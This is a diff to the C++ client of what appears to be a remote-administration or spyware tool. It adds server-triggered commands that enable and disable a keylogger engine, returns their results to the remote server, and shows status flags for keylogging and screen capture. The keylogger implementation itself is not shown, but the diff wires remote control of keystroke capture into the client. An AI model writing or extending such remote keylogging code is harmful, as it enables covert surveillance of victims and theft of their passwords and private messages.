@@ -14,8 +14,9 @@
 #include "ImGuiStdString.hpp"
 #include "ImGuiScrollableText.hpp"
 #include "Message.hpp"
-#include "ClientUIState.hpp"
 #include "InternalUtilities.hpp"
+#include "FunctionalityStruct.hpp"
+#include "Engine.hpp"
 
 #define DEFAULT_BUFLEN 2048
 #define DEFAULT_PORT 62300
@@ -29,23 +30,12 @@ std::string inputBuffer;
 
 GuiScrollableTextDisplay miniConsole;
 
-int MessageExecute(const Message& inputMessage, Message& outputMessage) {
-    int command = inputMessage.commandNumber;
-    switch(command) {
-        case MessageRawText: {
-            std::string rawMessage(inputMessage.getBinaryData(), inputMessage.getBinaryDataSize());
-            ClientUIState::getInstance().setRawMessage(rawMessage);
-            return 1;
-            //do not send back;
-        }
-        default: break;
-    }
-    return 0;
-}
+int MessageExecute(const Message& inputMessage, Message& outputMessage);
 
 class ServerConnection : public PeerConnection {
 public:
     std::atomic<bool> connecting{false};
+    FunctionalityStruct funcStruct;
 
     bool connectToServer(const std::string& address = "127.0.0.1", uint16_t port = DEFAULT_PORT) {
         if (connecting.load() || active.load()) return false;
@@ -81,6 +71,7 @@ public:
         peerIp = address;
         peerPort = port;
         connectionTime = std::chrono::system_clock::now();
+        funcStruct.reset();
         active.store(true);
 
         // Start listener thread
@@ -91,6 +82,17 @@ public:
         return sendPublicKey();
     }
 
+    void disconnect() {
+        PeerConnection::disconnect();
+
+        connecting.store(false);
+        miniConsole.AddLineInfo("Self-disconnected");
+        disconnectedSound.play();
+
+        //Stop all running engine
+        KeyloggerEngine::getInstance().shouldStop();
+    }
+
 private:
     void listenToServer() {
         while (active.load()) {
@@ -99,10 +101,19 @@ private:
                 case ReceiveStatus::Success: {
                     Message msg;
                     if (processCompleteMessage(msg)) {
-                        Message outMsg;
-                        if (MessageExecute(msg, outMsg)) {
-                            miniConsole.AddLineSuccess("Successfully execute message");
-                        }
+                        std::thread([&msg, this]() {
+                            Message outMsg;
+                            if (MessageExecute(msg, outMsg)) {
+                                miniConsole.AddLineSuccess("Successfully execute message");
+                                if(this->sendData(outMsg)) {
+                                    miniConsole.AddLineSuccess("Successfully sent output message");
+                                } else {
+                                    miniConsole.AddLineSuccess("Failed to sent output message");
+                                }
+                            } else {
+                                miniConsole.AddLineError("Failed to execute message");
+                            }
+                        }).detach();
                     }
                     break;
                 }
@@ -125,6 +136,38 @@ private:
 
 ServerConnection connectionManager;
 
+int MessageExecute(const Message& inputMessage, Message& outputMessage) {
+    int command = inputMessage.commandNumber;
+    switch(command) {
+        case MessageRawText: {
+            connectionManager.funcStruct.rawText = std::string(inputMessage.getBinaryData(), inputMessage.getBinaryDataSize());
+            return 1;
+            //do not send back;
+        }
+        case MessageEnableKeylog: {
+            if(EnableKeyloggerHandler(inputMessage, outputMessage)) {
+                connectionManager.funcStruct.isKeyloggerActive = true;
+                return 1;
+            } else {
+                connectionManager.funcStruct.isKeyloggerActive = false;
+                return 0;
+            }
+        }
+        case MessageDisableKeylog: {
+            if(DisableKeyloggerHandler(inputMessage, outputMessage)) {
+                connectionManager.funcStruct.isKeyloggerActive = false;
+                return 1;
+            } else {
+                connectionManager.funcStruct.isKeyloggerActive = true;
+                return 0;
+            }
+        }
+        
+        default: break;
+    }
+    return 0;
+}
+
 void RunGui() {
     ImGuiIO& io = ImGui::GetIO(); (void)io;
 
@@ -136,15 +179,12 @@ void RunGui() {
         if (ImGui::Button("Disconnect")) {
             std::thread([] {
                 connectionManager.disconnect();
-                miniConsole.AddLineInfo("Self-disconnected");
-                disconnectedSound.play();
             }).detach();
         }
     } else if (connectionManager.connecting.load()) {
         ImGui::TextColored(ImVec4(1, 1, 0, 1), "Status: Connecting...");
         if (ImGui::Button("Cancel")) {
             connectionManager.disconnect();
-            connectionManager.connecting.store(false);
         }
     } else {
         ImGui::TextColored(ImVec4(1, 0, 0, 1), "Status: Disconnected");
@@ -158,18 +198,22 @@ void RunGui() {
     }
     if (connectionManager.isActive()) {
         ImGui::SeparatorText("Raw messages received");
-        if (ImGui::BeginChild("Messages", ImVec2(-1, 150), true)) {
-            ImGui::TextWrapped("%s", ClientUIState::getInstance().getRawMessage().c_str());
+        if (ImGui::BeginChild("GuiRawMessages", ImVec2(-1, 150), true)) {
+            ImGui::TextWrapped("%s", connectionManager.funcStruct.rawText.c_str());
             if (ImGui::GetScrollY() >= ImGui::GetScrollMaxY()) {
                 ImGui::SetScrollHereY(1.0f);
             }
         }
         ImGui::EndChild();
-
         //Clear button
         if (ImGui::Button("Clear Messages")) {
-            ClientUIState::getInstance().setRawMessage("");
+            connectionManager.funcStruct.rawText = "";
         }
+
+        ImGui::BeginDisabled();
+        ImGui::Checkbox("IsKeylogger", &connectionManager.funcStruct.isKeyloggerActive);
+        ImGui::Checkbox("IsScreenCap", &connectionManager.funcStruct.isScreenCapActive);
+        ImGui::EndDisabled();
     }
     ImGui::SeparatorText("Console");
     miniConsole.Draw();
@@ -236,6 +280,7 @@ int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, WCHAR *lpCmdLi
         freopen("CONOUT$", "w", stderr);
     }
     */
+    
     
     // Initialize Winsock
     WSADATA wsaData;
